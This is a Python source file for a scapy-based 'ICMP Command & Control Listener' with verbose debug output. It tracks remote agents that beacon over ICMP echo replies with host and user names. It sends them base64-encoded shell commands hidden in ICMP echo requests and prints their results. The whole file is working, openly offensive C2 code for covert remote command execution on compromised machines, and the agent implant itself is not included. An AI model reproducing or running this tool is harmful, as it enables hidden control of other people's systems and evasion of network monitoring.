#!/usr/bin/env python3

from scapy.all import *
import base64
import threading
import time
import select
import sys
import os
from datetime import datetime

class DebugICMPListener:
    def __init__(self):
        self.agents = {}
        self.running = True
        self.last_beacon_time = {}
        self.command_counter = 0
        self.pending_commands = {}
        
    def handle_packet(self, pkt):
        """Handle incoming ICMP packets with enhanced debugging"""
        if not self.running:
            return
            
        if pkt.haslayer(ICMP):
            ip = pkt[IP].src
            icmp_type = pkt[ICMP].type
            
            # Only process ICMP Echo Reply (type 0) from agents
            # Ignore Echo Request (type 8) which are our outgoing commands
            if icmp_type != 0:
                print(f"[DEBUG PACKET] Ignoring ICMP type {icmp_type} from {ip}")
                return
            
            print(f"[DEBUG PACKET] ICMP Echo Reply (type 0) from {ip}")
            
            # Extract data from ICMP packet
            raw_data = None
            if pkt.haslayer(Raw):
                raw_data = bytes(pkt[Raw].load)
            elif hasattr(pkt[ICMP], 'load') and pkt[ICMP].load:
                raw_data = bytes(pkt[ICMP].load)
            
            if raw_data:
                print(f"[DEBUG PACKET] From {ip}: {len(raw_data)} bytes (REPLY)")
                print(f"[DEBUG PACKET] Raw data (first 100 bytes): {raw_data[:100]}")
                
                decoded = self.decode_data(raw_data)
                if decoded:
                    print(f"[DEBUG PACKET] Successfully decoded: '{decoded[:150]}...'")
                    self.process_message(ip, decoded)
                else:
                    print(f"[DEBUG PACKET] Failed to decode data")
                    # Try to show raw data as string for debugging
                    try:
                        raw_str = raw_data.decode('utf-8', errors='ignore').strip()
                        print(f"[DEBUG PACKET] Raw as string: '{raw_str[:100]}...'")
                    except:
                        print(f"[DEBUG PACKET] Cannot convert raw data to string")
            else:
                print(f"[DEBUG PACKET] No data in ICMP reply from {ip}")
    
    def decode_data(self, raw_data):
        """Decode ICMP data with detailed debugging"""
        print(f"[DEBUG DECODE] Starting decode process...")
        
        try:
            # Clean the data first
            clean_data = raw_data.replace(b'\x00', b'').strip()
            print(f"[DEBUG DECODE] Cleaned data length: {len(clean_data)}")
            
            if not clean_data:
                print(f"[DEBUG DECODE] No data after cleaning")
                return None
                
            # Method 1: Direct Base64 decode
            try:
                print(f"[DEBUG DECODE] Attempting direct Base64 decode...")
                decoded = base64.b64decode(clean_data, validate=True)
                result = decoded.decode('utf-8', errors='ignore').strip()
                print(f"[DEBUG DECODE] Direct Base64 success: '{result[:100]}...'")
                if result and '|' in result:
                    return result
            except Exception as e:
                print(f"[DEBUG DECODE] Direct Base64 failed: {e}")
                
            # Method 2: UTF-8 then Base64
            try:
                print(f"[DEBUG DECODE] Attempting UTF-8 then Base64...")
                text = clean_data.decode('utf-8', errors='ignore').strip()
                print(f"[DEBUG DECODE] UTF-8 decoded: '{text[:100]}...'")
                
                if text:
                    # Check if it looks like base64
                    try:
                        decoded = base64.b64decode(text, validate=True)
                        result = decoded.decode('utf-8', errors='ignore').strip()
                        print(f"[DEBUG DECODE] UTF-8->Base64 success: '{result[:100]}...'")
                        if result and '|' in result:
                            return result
                    except Exception as e:
                        print(f"[DEBUG DECODE] UTF-8->Base64 failed: {e}")
                        # Return UTF-8 decoded text if it contains |
                        if '|' in text:
                            print(f"[DEBUG DECODE] Using UTF-8 text directly")
                            return text
            except Exception as e:
                print(f"[DEBUG DECODE] UTF-8 decode failed: {e}")
                
        except Exception as e:
            print(f"[DEBUG DECODE] General decode error: {e}")
            
        print(f"[DEBUG DECODE] All decode methods failed")
        return None
    
    def process_message(self, ip, message):
        """Process agent messages with enhanced debugging"""
        try:
            print(f"\n[DEBUG MESSAGE] Processing from {ip}")
            print(f"[DEBUG MESSAGE] Full message: '{message}'")
            
            if '|' not in message:
                print(f"[DEBUG MESSAGE] No pipe separator found")
                return
                
            parts = message.split('|')
            print(f"[DEBUG MESSAGE] Split into {len(parts)} parts: {parts}")
            
            if len(parts) < 2:
                print(f"[DEBUG MESSAGE] Not enough parts")
                return
                
            msg_type = parts[0].upper()
            print(f"[DEBUG MESSAGE] Message type: '{msg_type}'")
            
            if msg_type == "BEACON":
                print(f"[DEBUG MESSAGE] Processing BEACON")
                self.handle_beacon(ip, parts)
            
            elif msg_type == "OUTPUT":
                print(f"[DEBUG MESSAGE] Processing OUTPUT - THIS IS WHAT WE WANT!")
                self.handle_output(ip, parts)
            
            elif msg_type == "SYSINFO":
                print(f"[DEBUG MESSAGE] Processing SYSINFO")
                self.handle_sysinfo(ip, parts)
            
            elif msg_type == "STATUS":
                print(f"[DEBUG MESSAGE] Processing STATUS")
                print(f"\n[+] STATUS from {ip}: {parts[2] if len(parts) > 2 else 'Unknown'}")
                self.print_prompt()
            
            elif msg_type == "ERROR":
                print(f"[DEBUG MESSAGE] Processing ERROR")
                print(f"\n[!] ERROR from {ip}: {parts[2] if len(parts) > 2 else 'Unknown'}")
                self.print_prompt()
            
            else:
                print(f"[DEBUG MESSAGE] UNKNOWN MESSAGE TYPE: '{msg_type}'")
                print(f"[DEBUG MESSAGE] This might be why responses aren't showing!")
                
        except Exception as e:
            print(f"[DEBUG MESSAGE] Error processing message: {e}")
    
    def handle_beacon(self, ip, parts):
        """Handle beacon messages"""
        current_time = time.time()
        
        print(f"[DEBUG BEACON] Parts: {parts}")
        
        # Only show beacon if this is a new agent or been a while
        if ip not in self.agents or (current_time - self.last_beacon_time.get(ip, 0)) > 30:
            if len(parts) >= 3:
                agent_id = parts[1]
                timestamp = parts[2] if len(parts) > 2 else "Unknown"
                computer = parts[3] if len(parts) > 3 else agent_id
                username = parts[4] if len(parts) > 4 else "Unknown"
                
                self.agents[ip] = {
                    'agent_id': agent_id,
                    'computer': computer,
                    'username': username,
                    'last_seen': datetime.now()
                }
                
                if ip not in self.last_beacon_time:
                    print(f"\n[+] Agent connected: {ip} ({computer}\\{username})")
                    self.print_prompt()
                
                self.last_beacon_time[ip] = current_time
            
        # Always update last seen
        if ip in self.agents:
            self.agents[ip]['last_seen'] = datetime.now()
    
    def handle_output(self, ip, parts):
        """Handle command output - ENHANCED DEBUG VERSION"""
        print(f"\n[DEBUG OUTPUT] COMMAND OUTPUT RECEIVED!")
        print(f"[DEBUG OUTPUT] From: {ip}")
        print(f"[DEBUG OUTPUT] Parts count: {len(parts)}")
        print(f"[DEBUG OUTPUT] All parts: {parts}")
        
        if len(parts) >= 3:
            command_id = parts[1]
            
            # Mark command as received
            if command_id in self.pending_commands:
                print(f"[DEBUG OUTPUT] Found pending command {command_id}")
                del self.pending_commands[command_id]
            else:
                print(f"[DEBUG OUTPUT] Command {command_id} not in pending list")
            
            if len(parts) >= 5:
                # Multi-chunk format: OUTPUT|CMD_ID|CHUNK|TOTAL|DATA
                chunk_num = parts[2]
                total_chunks = parts[3]
                output = parts[4]
                print(f"[DEBUG OUTPUT] Multi-chunk format detected")
                print(f"\nCOMMAND RESULT from {ip} (Command {command_id}, chunk {chunk_num}/{total_chunks}):")
            else:
                # Simple format: OUTPUT|CMD_ID|DATA
                output = '|'.join(parts[2:])  # Join all remaining parts as output
                print(f"[DEBUG OUTPUT] Simple format detected")
                print(f"\nCOMMAND RESULT from {ip} (Command {command_id}):")
            
            print("=" * 60)
            print(output)
            print("=" * 60)
            self.print_prompt()
        else:
            print(f"[DEBUG OUTPUT] Invalid output format - not enough parts: {parts}")
    
    def handle_sysinfo(self, ip, parts):
        """Handle system info"""
        print(f"[DEBUG SYSINFO] Parts: {parts}")
        
        if len(parts) >= 3:
            command_id = parts[1]
            sys_info = '|'.join(parts[2:])  # Join all remaining parts
            
            print(f"\n[+] SYSTEM INFO from {ip} (ID: {command_id}):")
            print("-" * 50)
            print(sys_info)
            print("-" * 50)
            self.print_prompt()
        else:
            print(f"[DEBUG SYSINFO] Invalid sysinfo format: {parts}")
    
    def print_prompt(self):
        """Print command prompt"""
        print("ICMP> ", end="", flush=True)
    
    def send_icmp_command(self, target_ip, command_type, command_data):
        """Send command via ICMP packet with enhanced debugging"""
        try:
            self.command_counter += 1
            command_id = f"CMD_{self.command_counter:03d}"
            
            # Format: COMMAND|command_id|type|data
            message = f"COMMAND|{command_id}|{command_type}|{command_data}"
            
            print(f"\n[DEBUG SEND] Preparing command...")
            print(f"[DEBUG SEND] Message: '{message}'")
            print(f"[DEBUG SEND] Message length: {len(message)}")
            
            # Encode in base64 for reliable transmission
            encoded_message = base64.b64encode(message.encode('utf-8'))
            print(f"[DEBUG SEND] Base64 encoded: '{encoded_message.decode()}'")
            print(f"[DEBUG SEND] Encoded length: {len(encoded_message)}")
            
            # Create ICMP packet with command
            packet = IP(dst=target_ip)/ICMP(type=8, code=0)/Raw(load=encoded_message)
            
            # Track pending command
            self.pending_commands[command_id] = {
                'command': command_data,
                'target': target_ip,
                'sent_time': time.time(),
                'type': command_type
            }
            
            print(f"[DEBUG SEND] Sending {command_type} via ICMP to {target_ip}")
            if command_data:
                print(f"[DEBUG SEND] Command: '{command_data}'")
            print(f"[DEBUG SEND] Command ID: {command_id}")
            
            # Send the packet
            send(packet, verbose=0)
            
            print(f"[DEBUG SEND] ICMP packet sent! Waiting for response...")
            print(f"[DEBUG SEND] Expected response format: OUTPUT|{command_id}|<result>")
            
            return True
            
        except Exception as e:
            print(f"[DEBUG SEND] Error sending ICMP command: {e}")
            return False
    
    def send_command(self, agent_ip, command):
        """Send command to agent via ICMP"""
        if agent_ip not in self.agents:
            print(f"[!] Agent {agent_ip} not found. Available agents:")
            for ip in self.agents.keys():
                agent_info = self.agents[ip]
                print(f"    {ip} ({agent_info.get('computer', 'Unknown')})")
            return False
        
        return self.send_icmp_command(agent_ip, "CMD", command)
    
    def send_sysinfo_request(self, agent_ip):
        """Request system info via ICMP"""
        if agent_ip not in self.agents:
            print(f"[!] Agent {agent_ip} not found")
            return False
        
        return self.send_icmp_command(agent_ip, "SYSINFO", "")
    
    def process_input(self, cmd_line):
        """Process user input"""
        cmd_line = cmd_line.strip()
        
        if not cmd_line:
            return True
        
        # Check for exit commands
        if cmd_line.lower() in ['exit', 'quit', 'q']:
            return False
        
        # Check for help
        if cmd_line.lower() == 'help':
            self.show_help()
            return True
        
        # Check for agents list
        if cmd_line.lower() == 'agents':
            self.show_agents()
            return True
        
        # Check for pending commands
        if cmd_line.lower() == 'pending':
            self.show_pending()
            return True
        
        # Check for debug info
        if cmd_line.lower() == 'debug':
            self.show_debug_info()
            return True
        
        # Check for system info request
        if cmd_line.lower().startswith('sysinfo'):
            parts = cmd_line.split()
            if len(parts) == 2:
                agent_ip = parts[1]
                self.send_sysinfo_request(agent_ip)
            elif len(parts) == 1 and self.agents:
                agent_ip = list(self.agents.keys())[0]
                self.send_sysinfo_request(agent_ip)
            else:
                print("[!] Usage: sysinfo [agent_ip]")
            return True
        
        # Everything else is treated as a command
        parts = cmd_line.split(' ', 1)
        
        if len(parts) == 1:
            # Just a command, use first available agent
            if not self.agents:
                print("[!] No agents connected")
                return True
            
            agent_ip = list(self.agents.keys())[0]
            command = parts[0]
        else:
            # Check if first part is an IP address
            potential_ip = parts[0]
            if potential_ip in self.agents:
                agent_ip = potential_ip
                command = parts[1]
            else:
                # Treat whole thing as command for first agent
                if not self.agents:
                    print("[!] No agents connected")
                    return True
                agent_ip = list(self.agents.keys())[0]
                command = cmd_line
        
        self.send_command(agent_ip, command)
        return True
    
    def show_agents(self):
        """Show connected agents"""
        if not self.agents:
            print("\n[!] No agents connected")
            return
        
        print(f"\n[+] Connected agents ({len(self.agents)}):")
        for ip, info in self.agents.items():
            agent_id = info.get('agent_id', 'Unknown')
            computer = info.get('computer', 'Unknown')
            username = info.get('username', 'Unknown')
            last_seen = info['last_seen'].strftime("%H:%M:%S")
            print(f"    {ip} - {agent_id} ({computer}\\{username}) (last seen: {last_seen})")
    
    def show_pending(self):
        """Show pending commands"""
        if not self.pending_commands:
            print("\n[+] No pending commands")
            return
        
        print(f"\n[+] Pending commands ({len(self.pending_commands)}):")
        current_time = time.time()
        for cmd_id, info in self.pending_commands.items():
            elapsed = int(current_time - info['sent_time'])
            print(f"    {cmd_id}: '{info['command']}' -> {info['target']} ({elapsed}s ago)")
    
    def show_debug_info(self):
        """Show debug information"""
        print(f"\n[DEBUG INFO] Listener Status:")
        print(f"    Connected agents: {len(self.agents)}")
        print(f"    Pending commands: {len(self.pending_commands)}")
        print(f"    Command counter: {self.command_counter}")
        print(f"    Running: {self.running}")
        
        if self.agents:
            print(f"\n[DEBUG INFO] Agent Details:")
            for ip, info in self.agents.items():
                print(f"    {ip}: {info}")
                
        if self.pending_commands:
            print(f"\n[DEBUG INFO] Pending Commands:")
            for cmd_id, info in self.pending_commands.items():
                print(f"    {cmd_id}: {info}")
    
    def show_help(self):
        """Show help information"""
        print("""
Enhanced DEBUG ICMP Command Interface:

Usage:
  <command>              - Execute command on first available agent
  <ip> <command>         - Execute command on specific agent
  sysinfo [ip]           - Get system information from agent
  agents                 - List connected agents
  pending                - Show pending commands
  debug                  - Show detailed debug information
  help                   - Show this help
  exit/quit/q           - Exit

Examples:
  whoami                           # Run on first agent
  192.168.1.129 hostname           # Run on specific agent
  time                            # Run on first agent
  sysinfo 192.168.1.129           # Get system info
  agents                          # List all agents

Debug Features:
  - Detailed packet capture analysis
  - Base64 encoding/decoding traces
  - Message type identification
  - Response format validation
  - Timing information
        """)
    
    def cleanup_pending(self):
        """Clean up old pending commands"""
        current_time = time.time()
        timeout = 30  # Reduced timeout for debugging
        
        expired = []
        for cmd_id, info in self.pending_commands.items():
            if current_time - info['sent_time'] > timeout:
                expired.append(cmd_id)
        
        for cmd_id in expired:
            print(f"[DEBUG TIMEOUT] Command {cmd_id} timed out after {timeout}s")
            del self.pending_commands[cmd_id]
    
    def start_capture(self):
        """Start packet capture"""
        try:
            print("[+] Starting enhanced ICMP packet capture...")
            sniff(filter="icmp", prn=self.handle_packet, store=0, stop_filter=lambda x: not self.running)
        except Exception as e:
            print(f"[!] Capture error: {e}")
    
    def start(self):
        """Start the listener"""
        print("=" * 70)
        print("DEBUG ICMP Command & Control Listener")
        print("=" * 70)
        print("[+] Enhanced debugging enabled")
        print("[+] Detailed packet analysis")
        print("[+] Base64 encoding/decoding traces")
        print("[+] Message format validation")
        print("[+] Response tracking and timing")
        print("[+] Type 'help' for usage, 'debug' for status")
        
        # Start capture in background
        capture_thread = threading.Thread(target=self.start_capture)
        capture_thread.daemon = True
        capture_thread.start()
        
        time.sleep(1)
        print("[+] Waiting for agents... (DEBUG MODE ACTIVE)")
        self.print_prompt()
        
        try:
            while self.running:
                # Non-blocking input check
                if select.select([sys.stdin], [], [], 0.1)[0]:
                    command = input().strip()
                    if not self.process_input(command):
                        break
                    self.print_prompt()
                else:
                    # Clean up old pending commands periodically
                    if int(time.time()) % 15 == 0:  # Every 15 seconds
                        self.cleanup_pending()
                    time.sleep(0.1)
                    
        except KeyboardInterrupt:
            print("\n[!] Interrupted by user")
        except EOFError:
            print("\n[!] EOF received")
        
        self.running = False
        print("\n[!] Shutting down debug listener...")

def main():
    # Check if running as root
    if os.geteuid() != 0:
        print("[!] This script requires root privileges to send ICMP packets")
        print("[!] Run with: sudo python3 script.py")
        return
    
    listener = DebugICMPListener()
    
    try:
        listener.start()
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    main()
